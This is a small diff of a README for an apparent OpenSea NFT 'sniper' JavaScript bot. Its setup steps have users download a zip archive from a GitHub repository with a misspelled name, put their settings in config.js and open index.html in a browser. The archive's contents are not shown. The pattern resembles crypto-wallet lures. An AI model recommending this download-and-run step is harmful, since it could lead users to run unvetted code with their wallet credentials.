@@ -5,6 +5,7 @@ Steps on setting it up
 <ol><li>
 Download and unzip folder in an easy accessible location for you. You can get it here https://github.com/lexingtondavid46/opeasea-nft-sniper-javascript-bot/blob/main/opensea-nft-sniper.zip
 </li><li>
+
 In the unzip folder you will find config.js you will need to edit this in a text editor to configure the settings. This should be simple and straightforward enough.
 </li><li>
 After config.js is edited and saved with your settings simply run index.html in your webbrowser. 
